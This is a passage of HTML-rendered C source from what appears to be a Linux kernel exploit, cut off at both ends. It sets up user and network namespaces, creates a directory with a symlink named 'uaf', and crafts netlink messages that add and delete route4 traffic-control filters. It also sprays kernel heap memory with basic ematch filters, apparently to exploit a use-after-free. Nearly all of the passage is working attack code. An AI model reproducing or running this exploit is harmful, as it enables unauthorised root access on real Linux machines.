class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">const</span> <span class="keyword">char</span> *what, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setup_common</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="number">0</span>, <span class="string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="string">&quot;fusectl&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg) \</span></span><br><span class="line"><span class="meta">    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span> *attr, <span class="keyword">int</span> type, <span class="keyword">void</span> *data, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span> =</span> (struct rtattr *)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">int</span> alen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr *<span class="title">addattr_nest</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr *n, struct rtattr *nest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span> *)NLMSG_TAIL(n) - (<span class="keyword">void</span> *)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    DumpHex(msg, msg-&gt;nlmsg_len);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">u_int16_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// basic for spray</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span> *spray_data, <span class="keyword">size_t</span> spray_len,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">int</span> spray_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123;.nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rt_match_tail</span> =</span></span><br><span class="line">        addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++)</span><br><span class="line">    &#123;</span><br><span 